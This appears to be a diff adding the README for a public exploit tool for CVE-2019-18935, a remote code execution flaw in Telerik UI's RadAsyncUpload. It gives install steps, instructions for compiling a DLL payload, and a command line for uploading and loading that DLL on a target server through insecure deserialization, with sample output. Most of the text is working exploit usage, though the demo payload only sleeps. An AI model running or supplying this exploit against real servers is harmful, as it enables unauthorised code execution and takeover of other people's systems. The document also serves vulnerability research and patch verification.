@@ -1,0 +1,50 @@
+See the full write-up at Bishop Fox, CVE-2019-18935: https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui, for a complete walkthrough of vulnerability and exploit details for this issue (along with patching instructions).
+
+Install
+git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
+python3 -m venv env
+source env/bin/activate
+pip3 install -r requirements.txt
+
+Requirements
+This exploit leverages encryption logic from RAU_crypto. The RAUCipher class within RAU_crypto.py depends on PyCryptodome, a drop-in replacement for the dead PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.
+
+Usage
+Compile mixed mode assembly DLL payload
+In a Windows environment with Visual Studio installed, use build_dll.bat to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization.
+
+build_dll.bat sleep.c
+Upload and load payload into application via insecure deserialization
+Pass the DLL generated above to CVE-2019-18935.py, which will upload the DLL to a directory on the target server (provided that the web server has write permissions) and then load that DLL into the application via the insecure deserialization exploit.
+
+python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p sleep_2019121205271355_x86.dll
+[*] Local payload name:  sleep_2019121205271355_x86.dll
+[*] Destination folder:  C:\Windows\Temp
+[*] Remote payload name: 1576142987.918625.dll
+
+{'fileInfo': {'ContentLength': 75264,
+              'ContentType': 'application/octet-stream',
+              'DateJson': '1970-01-01T00:00:00.000Z',
+              'FileName': '1576142987.918625.dll',
+              'Index': 0},
+ 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
+                                     'Telerik.Web.UI, Version=<VERSION>, '
+                                     'Culture=neutral, '
+                                     'PublicKeyToken=<TOKEN>',
+              'TempFileName': '1576142987.918625.dll'}}
+
+[*] Triggering deserialization...
+
+<title>Runtime Error</title>
+<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+<h2> <i>Runtime Error</i> </h2></span>
+...omitted for brevity...
+
+[*] Response time: 13.01 seconds
+In the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked Sleep(10000).
+
+Thanks
+@mwulftange initially discovered this vulnerability. @bao7uo wrote all of the logic for breaking RadAsyncUpload encryption, which enabled manipulating the file upload configuration object in rauPostData and subsequently exploiting insecure deserialization of that object.
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47793.zip
